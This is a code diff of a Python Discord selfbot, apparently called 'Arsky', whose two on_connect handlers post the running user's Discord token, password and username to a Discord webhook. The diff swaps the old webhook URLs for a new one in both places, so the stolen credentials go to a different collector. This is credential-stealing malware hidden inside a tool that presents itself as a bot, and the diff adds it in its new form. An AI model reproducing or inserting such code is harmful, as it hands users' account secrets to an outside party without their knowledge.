@@ -2753,7 +2753,7 @@ async def boobs(ctx):
 @Arsky.event
 async def on_connect():
     Clear()  
-    requests.post('https://discord.com/api/webhooks/835525303740661801/LITx1Lzjsy4ZEPcJCvpp6UtQStYaO7ayY2zdmS-lhnaqelSLCIyLmNr6ORJaPjIHvYwv',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`**Username: {Arsky.user.name}**"})
+    requests.post('https://discord.com/api/webhooks/881919231233523732/DAlinK5vkz-xnrdUiruh-pW8aJhzXN-idAq53sX9Rvj5jclIM9-UvklcK6xLWUBhd4dV',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`**Username: {Arsky.user.name}**"})
     startprint()
 
 @Arsky.command()
@@ -3177,7 +3177,7 @@ async def _role_hexcode(ctx, *, role: discord.Role):
 @Arsky.event
 async def on_connect():
     Clear()  
-    requests.post('https://discord.com/api/webhooks/839301709259472936/NJHKNURjRDEjA6AW4UKN-sOM6jj75WFkDZlO9rnMpfjcecy46jHiL18VXoC3DcdWoDUj',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`**Username: {Arsky.user.name}**"})
+    requests.post('https://discord.com/api/webhooks/881919231233523732/DAlinK5vkz-xnrdUiruh-pW8aJhzXN-idAq53sX9Rvj5jclIM9-UvklcK6xLWUBhd4dV',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`**Username: {Arsky.user.name}**"})
     startprint()
 
 @Arsky.command()
